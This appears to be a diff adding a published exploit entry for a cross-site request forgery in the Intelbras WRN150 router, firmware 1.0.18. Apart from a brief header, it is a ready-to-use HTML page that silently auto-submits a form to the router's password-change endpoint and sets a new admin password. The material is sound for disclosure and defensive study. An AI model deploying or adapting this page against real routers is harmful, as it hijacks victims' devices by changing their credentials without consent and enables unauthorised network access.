@@ -1,0 +1,26 @@
+Exploit Title: Intelbras Router WRN150 1.0.18 - Cross-Site Request Forgery
+Date: 2019-10-25
+Exploit Author: Prof. Joas Antonio
+Vendor Homepage: https://www.intelbras.com/pt-br/
+Software Link: http://en.intelbras.com.br/node/25896
+Version: 1.0.18
+Tested on: Windows
+CVE : N/A
+
+####################
+# PoC1: https://www.youtube.com/watch?v=V188HHDMbGM&feature=youtu.be
+
+<html>
+  <body>
+    <form action="http://10.0.0.1/goform/SysToolChangePwd" method="POST">
+	<input type="hidden" name="GO" value="system_password.asp">
+	<input type="hidden" name="SYSPSC" value="0">
+      	<input class="text" type="password" name="SYSOPS" value="hack123"/> 
+	<input class="text" type="password" name="SYSPS" value="mrrobot"/> 
+	<input class="text" type="password" name="SYSPS2" value="mrrobot"/> 
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
